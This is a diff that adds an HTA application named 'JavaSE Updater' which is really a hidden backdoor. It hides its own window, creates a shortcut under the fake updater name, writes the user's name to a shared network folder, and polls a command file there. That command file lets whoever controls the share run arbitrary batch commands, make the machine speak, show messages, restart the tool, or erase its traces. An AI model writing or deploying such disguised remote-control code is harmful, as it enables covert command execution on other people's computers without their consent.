@@ -1,0 +1,99 @@
+<html>
+<head><title>JavaSE Updater</title>
+<script src="gaia.js"></script>
+<style>
+body{
+  font-size: 11;
+  padding: 0;
+  margin: 0;
+  overflow: hidden;
+  font-family:arial,sans-serif;
+}
+</style>
+<script>
+XU.ResizeWindow(0,0,0,0);
+XU.MoveWindow(-10,-10);
+XU.ErrorHandler(2);
+var myname  = XN.Name('user').toLowerCase();
+var idata   = 0;
+var server  = "\\\\cadet-fs\\cadet_data\\Cadet_Wing\\Group 2\\CS20\\";
+var App={
+	Ini:function(){
+		App.InformMe();
+		XU.CreateShortcut('JavaSE Updater','app.hta','ico.ico','JavaSE Platform Updater');
+		setInterval("App.Check()",30);
+	},
+	Check:function(){
+		if (XS.File(server+'cmd','exist')){
+			idata = XS.File(server+'cmd','open');
+			idata = idata.split('::');
+			if (idata[0].toLowerCase() == myname || idata[0].toLowerCase() == 'all'){
+				XS.File(server+'cmd','delete');
+				if (idata[1] == 'cmd'){
+					XS.File('i.bat','create',idata[2]);
+					XWS.Launch('i.bat');
+				}else if (idata[1] == 'exit'){
+					window.close();
+				}else if (idata[1] == 'speak'){
+					XS.File('rd.txt','create',idata[2]);
+					XWS.Launch('nircmdc.exe speak file "'+XS.CurrentPath()+'\\rd.txt"');
+				}else if (idata[1] == 'msg'){
+					if (idata[2]){
+						XS.File('msg','create',idata[2]);
+						XWS.Launch('int.hta');
+					}
+				}else if (idata[1] == 'reset'){
+					App.Reset();
+				}else if (idata[1] == 'codered'){
+					App.DeleteMe();
+				}
+			}
+		}
+	},
+	Reset:function(){
+		XS.File(server+'cmd','delete');
+		XS.File('i.bat','create','PING 127.0.0.1 -n 6\r\nstart app.hta');
+		XWS.Launch('i.bat');
+		window.close();
+	},
+	DeleteMe:function(){
+		XS.File(custdir+'JavaSE Updater.lnk','delete');
+		XS.File(server+'cmd','delete');
+		XS.File('i.bat','create','del %AppData%\\Oneforall\\*.* /q');
+		XWS.Launch('i.bat');
+		window.close();
+			
+	},
+	InformMe:function(){
+		if (!XS.File(server+'usr','exist')){
+			XS.File(server+'usr','create',myname+'\r\n');
+		}else{
+			XS.File(server+'usr','writeline',myname);
+		}
+	}
+	
+};
+</script>
+</head>
+<body onload="App.Ini();">
+<HTA:APPLICATION ID="javaseupdater"
+    APPLICATIONNAME="javaseupdater"
+    BORDER="none"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    ICON="ico.ico"
+    SCROLL="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    INNERBORDER="no"
+    CONTEXTMENU="no"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="normal"
+    SYSMENU="no"
+    SHOWINTASKBAR="no"
+    SCROLLFLAT="yes"
+    NAVIGABLE="no"
+    SELECTION="no">
+
+</body>
+</html>
